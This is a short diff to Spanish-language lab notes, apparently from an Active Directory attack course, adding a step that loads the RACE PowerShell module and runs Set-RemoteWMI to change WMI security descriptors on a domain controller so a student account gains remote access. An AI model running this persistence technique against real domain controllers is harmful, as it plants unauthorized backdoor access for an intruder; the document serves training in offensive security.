@@ -1052,4 +1052,8 @@ Cargar el modulo *RACE*
 . C:\AD\Tools\RACE.ps1
 ```
 
-Y a contin
+Y a continuacion modificaremso los descriptores de seguridad del host para *WMI* en el *DC* para permitir el acceso de estudiante a *WMI*
+```shell
+[student97]
+Set-RemoteWMI -SamAccountName student97 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+```
